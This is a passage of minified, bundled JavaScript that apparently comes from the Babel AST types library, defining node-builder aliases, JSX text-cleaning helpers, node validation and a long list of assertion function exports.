0;zq.TSNumberKeyword=zq.TSNullKeyword=zq.TSNonNullExpression=zq.TSNeverKeyword=zq.TSNamespaceExportDeclaration=zq.TSNamedTupleMember=zq.TSModuleDeclaration=zq.TSModuleBlock=zq.TSMethodSignature=zq.TSMappedType=zq.TSLiteralType=zq.TSIntrinsicKeyword=zq.TSIntersectionType=zq.TSInterfaceDeclaration=zq.TSInterfaceBody=zq.TSInstantiationExpression=zq.TSInferType=zq.TSIndexedAccessType=zq.TSIndexSignature=zq.TSImportType=zq.TSImportEqualsDeclaration=zq.TSFunctionType=zq.TSExternalModuleReference=zq.TSExpressionWithTypeArguments=zq.TSExportAssignment=zq.TSEnumMember=zq.TSEnumDeclaration=zq.TSEnumBody=zq.TSDeclareMethod=zq.TSDeclareFunction=zq.TSConstructorType=zq.TSConstructSignatureDeclaration=zq.TSConditionalType=zq.TSCallSignatureDeclaration=zq.TSBooleanKeyword=zq.TSBigIntKeyword=zq.TSAsExpression=zq.TSArrayType=zq.TSAnyKeyword=zq.SymbolTypeAnnotation=zq.SwitchStatement=zq.SwitchCase=zq.Super=zq.StringTypeAnnotation=zq.StringLiteralTypeAnnotation=zq.StringLiteral=zq.StaticBlock=zq.SpreadProperty=zq.SpreadElement=zq.SequenceExpression=zq.ReturnStatement=zq.RestProperty=zq.RestElement=zq.RegexLiteral=zq.RegExpLiteral=zq.RecordExpression=zq.QualifiedTypeIdentifier=zq.Program=zq.PrivateName=zq.Placeholder=zq.PipelineTopicExpression=zq.PipelinePrimaryTopicReference=zq.PipelineBareFunction=zq.ParenthesizedExpression=zq.OptionalMemberExpression=zq.OptionalIndexedAccessType=zq.OptionalCallExpression=zq.OpaqueType=zq.ObjectTypeSpreadProperty=zq.ObjectTypeProperty=zq.ObjectTypeInternalSlot=zq.ObjectTypeIndexer=zq.ObjectTypeCallProperty=zq.ObjectTypeAnnotation=zq.ObjectProperty=zq.ObjectPattern=zq.ObjectMethod=zq.ObjectExpression=zq.NumericLiteral=zq.NumberTypeAnnotation=zq.NumberLiteralTypeAnnotation=zq.NumberLiteral=zq.NullableTypeAnnotation=zq.NullLiteralTypeAnnotation=zq.NullLiteral=zq.Noop=zq.NewExpression=zq.ModuleExpression=zq.MixedTypeAnnotation=zq.MetaProperty=zq.MemberExpression=zq.LogicalExpression=zq.LabeledStatement=zq.JSXText=zq.JSXSpreadChild=zq.JSXSpreadAttribute=zq.JSXOpeningFragment=zq.JSXOpeningElement=zq.JSXNamespacedName=zq.JSXMemberExpression=void 0;zq.YieldExpression=zq.WithStatement=zq.WhileStatement=zq.VoidTypeAnnotation=zq.VoidPattern=zq.Variance=zq.VariableDeclarator=zq.VariableDeclaration=zq.V8IntrinsicIdentifier=zq.UpdateExpression=zq.UnionTypeAnnotation=zq.UnaryExpression=zq.TypeofTypeAnnotation=zq.TypeParameterInstantiation=zq.TypeParameterDeclaration=zq.TypeParameter=zq.TypeCastExpression=zq.TypeAnnotation=zq.TypeAlias=zq.TupleTypeAnnotation=zq.TupleExpression=zq.TryStatement=zq.TopicReference=zq.ThrowStatement=zq.ThisTypeAnnotation=zq.ThisExpression=zq.TemplateLiteral=zq.TemplateElement=zq.TaggedTemplateExpression=zq.TSVoidKeyword=zq.TSUnknownKeyword=zq.TSUnionType=zq.TSUndefinedKeyword=zq.TSTypeReference=zq.TSTypeQuery=zq.TSTypePredicate=zq.TSTypeParameterInstantiation=zq.TSTypeParameterDeclaration=zq.TSTypeParameter=zq.TSTypeOperator=zq.TSTypeLiteral=zq.TSTypeAssertion=zq.TSTypeAnnotation=zq.TSTypeAliasDeclaration=zq.TSTupleType=zq.TSThisType=zq.TSTemplateLiteralType=zq.TSSymbolKeyword=zq.TSStringKeyword=zq.TSSatisfiesExpression=zq.TSRestType=zq.TSQualifiedName=zq.TSPropertySignature=zq.TSParenthesizedType=zq.TSParameterProperty=zq.TSOptionalType=zq.TSObjectKeyword=void 0;var _5=vW(),Wr1=uJ();function _(X){return _5[X]}var Gr1=zq.ArrayExpression=_("arrayExpression"),zr1=zq.AssignmentExpression=_("assignmentExpression"),Hr1=zq.BinaryExpression=_("binaryExpression"),Ur1=zq.InterpreterDirective=_("interpreterDirective"),Kr1=zq.Directive=_("directive"),Vr1=zq.DirectiveLiteral=_("directiveLiteral"),Br1=zq.BlockStatement=_("blockStatement"),qr1=zq.BreakStatement=_("breakStatement"),Zr1=zq.CallExpression=_("callExpression"),Mr1=zq.CatchClause=_("catchClause"),Fr1=zq.ConditionalExpression=_("conditionalExpression"),jr1=zq.ContinueStatement=_("continueStatement"),Or1=zq.DebuggerStatement=_("debuggerStatement"),Rr1=zq.DoWhileStatement=_("doWhileStatement"),Ar1=zq.EmptyStatement=_("emptyStatement"),Nr1=zq.ExpressionStatement=_("expressionStatement"),Lr1=zq.File=_("file"),Dr1=zq.ForInStatement=_("forInStatement"),wr1=zq.ForStatement=_("forStatement"),Ir1=zq.FunctionDeclaration=_("functionDeclaration"),Cr1=zq.FunctionExpression=_("functionExpression"),Pr1=zq.Identifier=_("identifier"),Sr1=zq.IfStatement=_("ifStatement"),Tr1=zq.LabeledStatement=_("labeledStatement"),_r1=zq.StringLiteral=_("stringLiteral"),Er1=zq.NumericLiteral=_("numericLiteral"),$r1=zq.NullLiteral=_("nullLiteral"),kr1=zq.BooleanLiteral=_("booleanLiteral"),br1=zq.RegExpLiteral=_("regExpLiteral"),vr1=zq.LogicalExpression=_("logicalExpression"),xr1=zq.MemberExpression=_("memberExpression"),fr1=zq.NewExpression=_("newExpression"),gr1=zq.Program=_("program"),hr1=zq.ObjectExpression=_("objectExpression"),yr1=zq.ObjectMethod=_("objectMethod"),mr1=zq.ObjectProperty=_("objectProperty"),ur1=zq.RestElement=_("restElement"),cr1=zq.ReturnStatement=_("returnStatement"),lr1=zq.SequenceExpression=_("sequenceExpression"),pr1=zq.ParenthesizedExpression=_("parenthesizedExpression"),dr1=zq.SwitchCase=_("switchCase"),ir1=zq.SwitchStatement=_("switchStatement"),rr1=zq.ThisExpression=_("thisExpression"),nr1=zq.ThrowStatement=_("throwStatement"),ar1=zq.TryStatement=_("tryStatement"),sr1=zq.UnaryExpression=_("unaryExpression"),or1=zq.UpdateExpression=_("updateExpression"),tr1=zq.VariableDeclaration=_("variableDeclaration"),er1=zq.VariableDeclarator=_("variableDeclarator"),Xn1=zq.WhileStatement=_("whileStatement"),Jn1=zq.WithStatement=_("withStatement"),Qn1=zq.AssignmentPattern=_("assignmentPattern"),Yn1=zq.ArrayPattern=_("arrayPattern"),Wn1=zq.ArrowFunctionExpression=_("arrowFunctionExpression"),Gn1=zq.ClassBody=_("classBody"),zn1=zq.ClassExpression=_("classExpression"),Hn1=zq.ClassDeclaration=_("classDeclaration"),Un1=zq.ExportAllDeclaration=_("exportAllDeclaration"),Kn1=zq.ExportDefaultDeclaration=_("exportDefaultDeclaration"),Vn1=zq.ExportNamedDeclaration=_("exportNamedDeclaration"),Bn1=zq.ExportSpecifier=_("exportSpecifier"),qn1=zq.ForOfStatement=_("forOfStatement"),Zn1=zq.ImportDeclaration=_("importDeclaration"),Mn1=zq.ImportDefaultSpecifier=_("importDefaultSpecifier"),Fn1=zq.ImportNamespaceSpecifier=_("importNamespaceSpecifier"),jn1=zq.ImportSpecifier=_("importSpecifier"),On1=zq.ImportExpression=_("importExpression"),Rn1=zq.MetaProperty=_("metaProperty"),An1=zq.ClassMethod=_("classMethod"),Nn1=zq.ObjectPattern=_("objectPattern"),Ln1=zq.SpreadElement=_("spreadElement"),Dn1=zq.Super=_("super"),wn1=zq.TaggedTemplateExpression=_("taggedTemplateExpression"),In1=zq.TemplateElement=_("templateElement"),Cn1=zq.TemplateLiteral=_("templateLiteral"),Pn1=zq.YieldExpression=_("yieldExpression"),Sn1=zq.AwaitExpression=_("awaitExpression"),Tn1=zq.Import=_("import"),_n1=zq.BigIntLiteral=_("bigIntLiteral"),En1=zq.ExportNamespaceSpecifier=_("exportNamespaceSpecifier"),$n1=zq.OptionalMemberExpression=_("optionalMemberExpression"),kn1=zq.OptionalCallExpression=_("optionalCallExpression"),bn1=zq.ClassProperty=_("classProperty"),vn1=zq.ClassAccessorProperty=_("classAccessorProperty"),xn1=zq.ClassPrivateProperty=_("classPrivateProperty"),fn1=zq.ClassPrivateMethod=_("classPrivateMethod"),gn1=zq.PrivateName=_("privateName"),hn1=zq.StaticBlock=_("staticBlock"),yn1=zq.ImportAttribute=_("importAttribute"),mn1=zq.AnyTypeAnnotation=_("anyTypeAnnotation"),un1=zq.ArrayTypeAnnotation=_("arrayTypeAnnotation"),cn1=zq.BooleanTypeAnnotation=_("booleanTypeAnnotation"),ln1=zq.BooleanLiteralTypeAnnotation=_("booleanLiteralTypeAnnotation"),pn1=zq.NullLiteralTypeAnnotation=_("nullLiteralTypeAnnotation"),dn1=zq.ClassImplements=_("classImplements"),in1=zq.DeclareClass=_("declareClass"),rn1=zq.DeclareFunction=_("declareFunction"),nn1=zq.DeclareInterface=_("declareInterface"),an1=zq.DeclareModule=_("declareModule"),sn1=zq.DeclareModuleExports=_("declareModuleExports"),on1=zq.DeclareTypeAlias=_("declareTypeAlias"),tn1=zq.DeclareOpaqueType=_("declareOpaqueType"),en1=zq.DeclareVariable=_("declareVariable"),Xa1=zq.DeclareExportDeclaration=_("declareExportDeclaration"),Ja1=zq.DeclareExportAllDeclaration=_("declareExportAllDeclaration"),Qa1=zq.DeclaredPredicate=_("declaredPredicate"),Ya1=zq.ExistsTypeAnnotation=_("existsTypeAnnotation"),Wa1=zq.FunctionTypeAnnotation=_("functionTypeAnnotation"),Ga1=zq.FunctionTypeParam=_("functionTypeParam"),za1=zq.GenericTypeAnnotation=_("genericTypeAnnotation"),Ha1=zq.InferredPredicate=_("inferredPredicate"),Ua1=zq.InterfaceExtends=_("interfaceExtends"),Ka1=zq.InterfaceDeclaration=_("interfaceDeclaration"),Va1=zq.InterfaceTypeAnnotation=_("interfaceTypeAnnotation"),Ba1=zq.IntersectionTypeAnnotation=_("intersectionTypeAnnotation"),qa1=zq.MixedTypeAnnotation=_("mixedTypeAnnotation"),Za1=zq.EmptyTypeAnnotation=_("emptyTypeAnnotation"),Ma1=zq.NullableTypeAnnotation=_("nullableTypeAnnotation"),Fa1=zq.NumberLiteralTypeAnnotation=_("numberLiteralTypeAnnotation"),ja1=zq.NumberTypeAnnotation=_("numberTypeAnnotation"),Oa1=zq.ObjectTypeAnnotation=_("objectTypeAnnotation"),Ra1=zq.ObjectTypeInternalSlot=_("objectTypeInternalSlot"),Aa1=zq.ObjectTypeCallProperty=_("objectTypeCallProperty"),Na1=zq.ObjectTypeIndexer=_("objectTypeIndexer"),La1=zq.ObjectTypeProperty=_("objectTypeProperty"),Da1=zq.ObjectTypeSpreadProperty=_("objectTypeSpreadProperty"),wa1=zq.OpaqueType=_("opaqueType"),Ia1=zq.QualifiedTypeIdentifier=_("qualifiedTypeIdentifier"),Ca1=zq.StringLiteralTypeAnnotation=_("stringLiteralTypeAnnotation"),Pa1=zq.StringTypeAnnotation=_("stringTypeAnnotation"),Sa1=zq.SymbolTypeAnnotation=_("symbolTypeAnnotation"),Ta1=zq.ThisTypeAnnotation=_("thisTypeAnnotation"),_a1=zq.TupleTypeAnnotation=_("tupleTypeAnnotation"),Ea1=zq.TypeofTypeAnnotation=_("typeofTypeAnnotation"),$a1=zq.TypeAlias=_("typeAlias"),ka1=zq.TypeAnnotation=_("typeAnnotation"),ba1=zq.TypeCastExpression=_("typeCastExpression"),va1=zq.TypeParameter=_("typeParameter"),xa1=zq.TypeParameterDeclaration=_("typeParameterDeclaration"),fa1=zq.TypeParameterInstantiation=_("typeParameterInstantiation"),ga1=zq.UnionTypeAnnotation=_("unionTypeAnnotation"),ha1=zq.Variance=_("variance"),ya1=zq.VoidTypeAnnotation=_("voidTypeAnnotation"),ma1=zq.EnumDeclaration=_("enumDeclaration"),ua1=zq.EnumBooleanBody=_("enumBooleanBody"),ca1=zq.EnumNumberBody=_("enumNumberBody"),la1=zq.EnumStringBody=_("enumStringBody"),pa1=zq.EnumSymbolBody=_("enumSymbolBody"),da1=zq.EnumBooleanMember=_("enumBooleanMember"),ia1=zq.EnumNumberMember=_("enumNumberMember"),ra1=zq.EnumStringMember=_("enumStringMember"),na1=zq.EnumDefaultedMember=_("enumDefaultedMember"),aa1=zq.IndexedAccessType=_("indexedAccessType"),sa1=zq.OptionalIndexedAccessType=_("optionalIndexedAccessType"),oa1=zq.JSXAttribute=_("jsxAttribute"),ta1=zq.JSXClosingElement=_("jsxClosingElement"),ea1=zq.JSXElement=_("jsxElement"),Xs1=zq.JSXEmptyExpression=_("jsxEmptyExpression"),Js1=zq.JSXExpressionContainer=_("jsxExpressionContainer"),Qs1=zq.JSXSpreadChild=_("jsxSpreadChild"),Ys1=zq.JSXIdentifier=_("jsxIdentifier"),Ws1=zq.JSXMemberExpression=_("jsxMemberExpression"),Gs1=zq.JSXNamespacedName=_("jsxNamespacedName"),zs1=zq.JSXOpeningElement=_("jsxOpeningElement"),Hs1=zq.JSXSpreadAttribute=_("jsxSpreadAttribute"),Us1=zq.JSXText=_("jsxText"),Ks1=zq.JSXFragment=_("jsxFragment"),Vs1=zq.JSXOpeningFragment=_("jsxOpeningFragment"),Bs1=zq.JSXClosingFragment=_("jsxClosingFragment"),qs1=zq.Noop=_("noop"),Zs1=zq.Placeholder=_("placeholder"),Ms1=zq.V8IntrinsicIdentifier=_("v8IntrinsicIdentifier"),Fs1=zq.ArgumentPlaceholder=_("argumentPlaceholder"),js1=zq.BindExpression=_("bindExpression"),Os1=zq.Decorator=_("decorator"),Rs1=zq.DoExpression=_("doExpression"),As1=zq.ExportDefaultSpecifier=_("exportDefaultSpecifier"),Ns1=zq.RecordExpression=_("recordExpression"),Ls1=zq.TupleExpression=_("tupleExpression"),Ds1=zq.DecimalLiteral=_("decimalLiteral"),ws1=zq.ModuleExpression=_("moduleExpression"),Is1=zq.TopicReference=_("topicReference"),Cs1=zq.PipelineTopicExpression=_("pipelineTopicExpression"),Ps1=zq.PipelineBareFunction=_("pipelineBareFunction"),Ss1=zq.PipelinePrimaryTopicReference=_("pipelinePrimaryTopicReference"),Ts1=zq.VoidPattern=_("voidPattern"),_s1=zq.TSParameterProperty=_("tsParameterProperty"),Es1=zq.TSDeclareFunction=_("tsDeclareFunction"),$s1=zq.TSDeclareMethod=_("tsDeclareMethod"),ks1=zq.TSQualifiedName=_("tsQualifiedName"),bs1=zq.TSCallSignatureDeclaration=_("tsCallSignatureDeclaration"),vs1=zq.TSConstructSignatureDeclaration=_("tsConstructSignatureDeclaration"),xs1=zq.TSPropertySignature=_("tsPropertySignature"),fs1=zq.TSMethodSignature=_("tsMethodSignature"),gs1=zq.TSIndexSignature=_("tsIndexSignature"),hs1=zq.TSAnyKeyword=_("tsAnyKeyword"),ys1=zq.TSBooleanKeyword=_("tsBooleanKeyword"),ms1=zq.TSBigIntKeyword=_("tsBigIntKeyword"),us1=zq.TSIntrinsicKeyword=_("tsIntrinsicKeyword"),cs1=zq.TSNeverKeyword=_("tsNeverKeyword"),ls1=zq.TSNullKeyword=_("tsNullKeyword"),ps1=zq.TSNumberKeyword=_("tsNumberKeyword"),ds1=zq.TSObjectKeyword=_("tsObjectKeyword"),is1=zq.TSStringKeyword=_("tsStringKeyword"),rs1=zq.TSSymbolKeyword=_("tsSymbolKeyword"),ns1=zq.TSUndefinedKeyword=_("tsUndefinedKeyword"),as1=zq.TSUnknownKeyword=_("tsUnknownKeyword"),ss1=zq.TSVoidKeyword=_("tsVoidKeyword"),os1=zq.TSThisType=_("tsThisType"),ts1=zq.TSFunctionType=_("tsFunctionType"),es1=zq.TSConstructorType=_("tsConstructorType"),Xo1=zq.TSTypeReference=_("tsTypeReference"),Jo1=zq.TSTypePredicate=_("tsTypePredicate"),Qo1=zq.TSTypeQuery=_("tsTypeQuery"),Yo1=zq.TSTypeLiteral=_("tsTypeLiteral"),Wo1=zq.TSArrayType=_("tsArrayType"),Go1=zq.TSTupleType=_("tsTupleType"),zo1=zq.TSOptionalType=_("tsOptionalType"),Ho1=zq.TSRestType=_("tsRestType"),Uo1=zq.TSNamedTupleMember=_("tsNamedTupleMember"),Ko1=zq.TSUnionType=_("tsUnionType"),Vo1=zq.TSIntersectionType=_("tsIntersectionType"),Bo1=zq.TSConditionalType=_("tsConditionalType"),qo1=zq.TSInferType=_("tsInferType"),Zo1=zq.TSParenthesizedType=_("tsParenthesizedType"),Mo1=zq.TSTypeOperator=_("tsTypeOperator"),Fo1=zq.TSIndexedAccessType=_("tsIndexedAccessType"),jo1=zq.TSMappedType=_("tsMappedType"),Oo1=zq.TSTemplateLiteralType=_("tsTemplateLiteralType"),Ro1=zq.TSLiteralType=_("tsLiteralType"),Ao1=zq.TSExpressionWithTypeArguments=_("tsExpressionWithTypeArguments"),No1=zq.TSInterfaceDeclaration=_("tsInterfaceDeclaration"),Lo1=zq.TSInterfaceBody=_("tsInterfaceBody"),Do1=zq.TSTypeAliasDeclaration=_("tsTypeAliasDeclaration"),wo1=zq.TSInstantiationExpression=_("tsInstantiationExpression"),Io1=zq.TSAsExpression=_("tsAsExpression"),Co1=zq.TSSatisfiesExpression=_("tsSatisfiesExpression"),Po1=zq.TSTypeAssertion=_("tsTypeAssertion"),So1=zq.TSEnumBody=_("tsEnumBody"),To1=zq.TSEnumDeclaration=_("tsEnumDeclaration"),_o1=zq.TSEnumMember=_("tsEnumMember"),Eo1=zq.TSModuleDeclaration=_("tsModuleDeclaration"),$o1=zq.TSModuleBlock=_("tsModuleBlock"),ko1=zq.TSImportType=_("tsImportType"),bo1=zq.TSImportEqualsDeclaration=_("tsImportEqualsDeclaration"),vo1=zq.TSExternalModuleReference=_("tsExternalModuleReference"),xo1=zq.TSNonNullExpression=_("tsNonNullExpression"),fo1=zq.TSExportAssignment=_("tsExportAssignment"),go1=zq.TSNamespaceExportDeclaration=_("tsNamespaceExportDeclaration"),ho1=zq.TSTypeAnnotation=_("tsTypeAnnotation"),yo1=zq.TSTypeParameterInstantiation=_("tsTypeParameterInstantiation"),mo1=zq.TSTypeParameterDeclaration=_("tsTypeParameterDeclaration"),uo1=zq.TSTypeParameter=_("tsTypeParameter"),co1=zq.NumberLiteral=_5.numberLiteral,lo1=zq.RegexLiteral=_5.regexLiteral,po1=zq.RestProperty=_5.restProperty,do1=zq.SpreadProperty=_5.spreadProperty});var l9=c((a6)=>{Object.defineProperty(a6,"__esModule",{value:!0});var xW=vW();Object.keys(xW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in a6&&a6[X]===xW[X])return;Object.defineProperty(a6,X,{enumerable:!0,get:function(){return xW[X]}})});var fW=Vq();Object.keys(fW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in a6&&a6[X]===fW[X])return;Object.defineProperty(a6,X,{enumerable:!0,get:function(){return fW[X]}})})});var qq=c((Bq)=>{Object.defineProperty(Bq,"__esModule",{value:!0});Bq.default=zX1;var WX1=l9(),GX1=U0();function zX1(X,J){let Q=X.value.split(/\r\n|\n|\r/),Y=0;for(let z=0;z<Q.length;z++)if(/[^ \t]/.exec(Q[z]))Y=z;let W="";for(let z=0;z<Q.length;z++){let G=Q[z],H=z===0,U=z===Q.length-1,K=z===Y,V=G.replace(/\t/g," ");if(!H)V=V.replace(/^ +/,"");if(!U)V=V.replace(/ +$/,"");if(V){if(!K)V+=" ";W+=V}}if(W)J.push(GX1.inherits(WX1.stringLiteral(W),X))}});var Mq=c((Zq)=>{Object.defineProperty(Zq,"__esModule",{value:!0});Zq.default=KX1;var gW=i0(),UX1=qq();function KX1(X){let J=[];for(let Q=0;Q<X.children.length;Q++){let Y=X.children[Q];if(gW.isJSXText(Y)){UX1.default(Y,J);continue}if(gW.isJSXExpressionContainer(Y))Y=Y.expression;if(gW.isJSXEmptyExpression(Y))continue;J.push(Y)}return J}});var hW=c((Fq)=>{Object.defineProperty(Fq,"__esModule",{value:!0});Fq.default=qX1;var BX1=Y8();function qX1(X){return!!(X&&BX1.VISITOR_KEYS[X.type])}});var Oq=c((jq)=>{Object.defineProperty(jq,"__esModule",{value:!0});jq.default=FX1;var MX1=hW();function FX1(X){if(!MX1.default(X)){var J;let Q=(J=X==null?void 0:X.type)!=null?J:JSON.stringify(X);throw new TypeError(`Not a valid node of type "${Q}"`)}}});var Aq=c((Rq)=>{Object.defineProperty(Rq,"__esModule",{value:!0});Rq.assertAccessor=f41;Rq.assertAnyTypeAnnotation=eJ1;Rq.assertArgumentPlaceholder=T51;Rq.assertArrayExpression=RX1;Rq.assertArrayPattern=jJ1;Rq.assertArrayTypeAnnotation=X71;Rq.assertArrowFunctionExpression=OJ1;Rq.assertAssignmentExpression=AX1;Rq.assertAssignmentPattern=FJ1;Rq.assertAwaitExpression=mJ1;Rq.assertBigIntLiteral=cJ1;Rq.assertBinary=Y41;Rq.assertBinaryExpression=NX1;Rq.assertBindExpression=_51;Rq.assertBlock=z41;Rq.assertBlockParent=G41;Rq.assertBlockStatement=IX1;Rq.assertBooleanLiteral=dX1;Rq.assertBooleanLiteralTypeAnnotation=Q71;Rq.assertBooleanTypeAnnotation=J71;Rq.assertBreakStatement=CX1;Rq.assertCallExpression=PX1;Rq.assertCatchClause=SX1;Rq.assertClass=k41;Rq.assertClassAccessorProperty=rJ1;Rq.assertClassBody=RJ1;Rq.assertClassDeclaration=NJ1;Rq.assertClassExpression=AJ1;Rq.assertClassImplements=W71;Rq.assertClassMethod=kJ1;Rq.assertClassPrivateMethod=aJ1;Rq.assertClassPrivateProperty=nJ1;Rq.assertClassProperty=iJ1;Rq.assertCompletionStatement=K41;Rq.assertConditional=V41;Rq.assertConditionalExpression=TX1;Rq.assertContinueStatement=_X1;Rq.assertDebuggerStatement=EX1;Rq.assertDecimalLiteral=x51;Rq.assertDeclaration=A41;Rq.assertDeclareClass=G71;Rq.assertDeclareExportAllDeclaration=M71;Rq.assertDeclareExportDeclaration=Z71;Rq.assertDeclareFunction=z71;Rq.assertDeclareInterface=H71;Rq.assertDeclareModule=U71;Rq.assertDeclareModuleExports=K71;Rq.assertDeclareOpaqueType=B71;Rq.assertDeclareTypeAlias=V71;Rq.assertDeclareVariable=q71;Rq.assertDeclaredPredicate=F71;Rq.assertDecorator=E51;Rq.assertDirective=DX1;Rq.assertDirectiveLiteral=wX1;Rq.assertDoExpression=$51;Rq.assertDoWhileStatement=$X1;Rq.assertEmptyStatement=kX1;Rq.assertEmptyTypeAnnotation=P71;Rq.assertEnumBody=l41;Rq.assertEnumBooleanBody=X51;Rq.assertEnumBooleanMember=W51;Rq.assertEnumDeclaration=e71;Rq.assertEnumDefaultedMember=H51;Rq.assertEnumMember=p41;Rq.assertEnumNumberBody=J51;Rq.assertEnumNumberMember=G51;Rq.assertEnumStringBody=Q51;Rq.assertEnumStringMember=z51;Rq.assertEnumSymbolBody=Y51;Rq.assertExistsTypeAnnotation=j71;Rq.assertExportAllDeclaration=LJ1;Rq.assertExportDeclaration=v41;Rq.assertExportDefaultDeclaration=DJ1;Rq.assertExportDefaultSpecifier=k51;Rq.assertExportNamedDeclaration=wJ1;Rq.assertExportNamespaceSpecifier=lJ1;Rq.assertExportSpecifier=IJ1;Rq.assertExpression=Q41;Rq.assertExpressionStatement=bX1;Rq.assertExpressionWrapper=Z41;Rq.assertFile=vX1;Rq.assertFlow=h41;Rq.assertFlowBaseAnnotation=m41;Rq.assertFlowDeclaration=u41;Rq.assertFlowPredicate=c41;Rq.assertFlowType=y41;Rq.assertFor=M41;Rq.assertForInStatement=xX1;Rq.assertForOfStatement=CJ1;Rq.assertForStatement=fX1;Rq.assertForXStatement=F41;Rq.assertFunction=j41;Rq.assertFunctionDeclaration=gX1;Rq.assertFunctionExpression=hX1;Rq.assertFunctionParameter=N41;Rq.assertFunctionParent=O41;Rq.assertFunctionTypeAnnotation=O71;Rq.assertFunctionTypeParam=R71;Rq.assertGenericTypeAnnotation=A71;Rq.assertIdentifier=yX1;Rq.assertIfStatement=mX1;Rq.assertImmutable=C41;Rq.assertImport=uJ1;Rq.assertImportAttribute=tJ1;Rq.assertImportDeclaration=PJ1;Rq.assertImportDefaultSpecifier=SJ1;Rq.assertImportExpression=EJ1;Rq.assertImportNamespaceSpecifier=TJ1;Rq.assertImportOrExportDeclaration=b41;Rq.assertImportSpecifier=_J1;Rq.assertIndexedAccessType=U51;Rq.assertInferredPredicate=N71;Rq.assertInterfaceDeclaration=D71;Rq.assertInterfaceExtends=L71;Rq.assertInterfaceTypeAnnotation=w71;Rq.assertInterpreterDirective=LX1;Rq.assertIntersectionTypeAnnotation=I71;Rq.assertJSX=d41;Rq.assertJSXAttribute=V51;Rq.assertJSXClosingElement=B51;Rq.assertJSXClosingFragment=I51;Rq.assertJSXElement=q51;Rq.assertJSXEmptyExpression=Z51;Rq.assertJSXExpressionContainer=M51;Rq.assertJSXFragment=D51;Rq.assertJSXIdentifier=j51;Rq.assertJSXMemberExpression=O51;Rq.assertJSXNamespacedName=R51;Rq.assertJSXOpeningElement=A51;Rq.assertJSXOpeningFragment=w51;Rq.assertJSXSpreadAttribute=N51;Rq.assertJSXSpreadChild=F51;Rq.assertJSXText=L51;Rq.assertLVal=D41;Rq.assertLabeledStatement=uX1;Rq.assertLiteral=I41;Rq.assertLogicalExpression=rX1;Rq.assertLoop=B41;Rq.assertMemberExpression=nX1;Rq.assertMetaProperty=$J1;Rq.assertMethod=S41;Rq.assertMiscellaneous=i41;Rq.assertMixedTypeAnnotation=C71;Rq.assertModuleDeclaration=J21;Rq.assertModuleExpression=f51;Rq.assertModuleSpecifier=x41;Rq.assertNewExpression=aX1;Rq.assertNoop=C51;Rq.assertNullLiteral=pX1;Rq.assertNullLiteralTypeAnnotation=Y71;Rq.assertNullableTypeAnnotation=S71;Rq.assertNumberLiteral=o41;Rq.assertNumberLiteralTypeAnnotation=T71;Rq.assertNumberTypeAnnotation=_71;Rq.assertNumericLiteral=lX1;Rq.assertObjectExpression=oX1;Rq.assertObjectMember=T41;Rq.assertObjectMethod=tX1;Rq.assertObjectPattern=bJ1;Rq.assertObjectProperty=eX1;Rq.assertObjectTypeAnnotation=E71;Rq.assertObjectTypeCallProperty=k71;Rq.assertObjectTypeIndexer=b71;Rq.assertObjectTypeInternalSlot=$71;Rq.assertObjectTypeProperty=v71;Rq.assertObjectTypeSpreadProperty=x71;Rq.assertOpaqueType=f71;Rq.assertOptionalCallExpression=dJ1;Rq.assertOptionalIndexedAccessType=K51;Rq.assertOptionalMemberExpression=pJ1;Rq.assertParenthesizedExpression=YJ1;Rq.assertPattern=$41;Rq.assertPatternLike=L41;Rq.assertPipelineBareFunction=y51;Rq.assertPipelinePrimaryTopicReference=m51;Rq.assertPipelineTopicExpression=h51;Rq.assertPlaceholder=P51;Rq.assertPrivate=g41;Rq.assertPrivateName=sJ1;Rq.assertProgram=sX1;Rq.assertProperty=_41;Rq.assertPureish=R41;Rq.assertQualifiedTypeIdentifier=g71;Rq.assertRecordExpression=b51;Rq.assertRegExpLiteral=iX1;Rq.assertRegexLiteral=t41;Rq.assertRestElement=XJ1;Rq.assertRestProperty=e41;Rq.assertReturnStatement=JJ1;Rq.assertScopable=W41;Rq.assertSequenceExpression=QJ1;Rq.assertSpreadElement=vJ1;Rq.assertSpreadProperty=X21;Rq.assertStandardized=J41;Rq.assertStatement=H41;Rq.assertStaticBlock=oJ1;Rq.assertStringLiteral=cX1;Rq.assertStringLiteralTypeAnnotation=h71;Rq.assertStringTypeAnnotation=y71;Rq.assertSuper=xJ1;Rq.assertSwitchCase=WJ1;Rq.assertSwitchStatement=GJ1;Rq.assertSymbolTypeAnnotation=m71;Rq.assertTSAnyKeyword=o51;Rq.assertTSArrayType=OQ1;Rq.assertTSAsExpression=gQ1;Rq.assertTSBaseType=s41;Rq.assertTSBigIntKeyword=e51;Rq.assertTSBooleanKeyword=t51;Rq.assertTSCallSignatureDeclaration=i51;Rq.assertTSConditionalType=IQ1;Rq.assertTSConstructSignatureDeclaration=r51;Rq.assertTSConstructorType=qQ1;Rq.assertTSDeclareFunction=l51;Rq.assertTSDeclareMethod=p51;Rq.assertTSEntityName=w41;Rq.assertTSEnumBody=mQ1;Rq.assertTSEnumDeclaration=uQ1;Rq.assertTSEnumMember=cQ1;Rq.assertTSExportAssignment=aQ1;Rq.assertTSExpressionWithTypeArguments=kQ1;Rq.assertTSExternalModuleReference=rQ1;Rq.assertTSFunctionType=BQ1;Rq.assertTSImportEqualsDeclaration=iQ1;Rq.assertTSImportType=dQ1;Rq.assertTSIndexSignature=s51;Rq.assertTSIndexedAccessType=TQ1;Rq.assertTSInferType=CQ1;Rq.assertTSInstantiationExpression=fQ1;Rq.assertTSInterfaceBody=vQ1;Rq.assertTSInterfaceDeclaration=bQ1;Rq.assertTSIntersectionType=wQ1;Rq.assertTSIntrinsicKeyword=XQ1;Rq.assertTSLiteralType=$Q1;Rq.assertTSMappedType=_Q1;Rq.assertTSMethodSignature=a51;Rq.assertTSModuleBlock=pQ1;Rq.assertTSModuleDeclaration=lQ1;Rq.assertTSNamedTupleMember=LQ1;Rq.assertTSNamespaceExportDeclaration=sQ1;Rq.assertTSNeverKeyword=JQ1;Rq.assertTSNonNullExpression=nQ1;Rq.assertTSNullKeyword=QQ1;Rq.assertTSNumberKeyword=YQ1;Rq.assertTSObjectKeyword=WQ1;Rq.assertTSOptionalType=AQ1;Rq.assertTSParameterProperty=c51;Rq.assertTSParenthesizedType=PQ1;Rq.assertTSPropertySignature=n51;Rq.assertTSQualifiedName=d51;Rq.assertTSRestType=NQ1;Rq.assertTSSatisfiesExpression=hQ1;Rq.assertTSStringKeyword=GQ1;Rq.assertTSSymbolKeyword=zQ1;Rq.assertTSTemplateLiteralType=EQ1;Rq